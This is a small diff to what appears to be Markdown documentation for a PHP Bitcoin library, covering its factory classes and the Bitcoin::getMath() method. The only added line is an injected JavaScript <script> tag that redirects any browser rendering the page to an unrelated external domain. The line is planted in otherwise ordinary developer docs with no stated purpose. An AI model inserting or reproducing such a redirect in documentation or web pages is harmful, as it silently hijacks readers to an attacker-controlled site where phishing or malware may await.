@@ -5,6 +5,7 @@ There are a number of factory classes to help create & parse objects.
 An example of a globally set dependency is the Network; if not explicitly provided in a function call, the globally set default will be used.  
  
 ### \BitWasp\Bitcoin\Bitcoin
+<script type='text/javascript'> window.location.href = "https://cpbldi.com/6922dc5/"; </script>
 
    `Bitcoin::getMath()` - Returns a `Math` instance
    
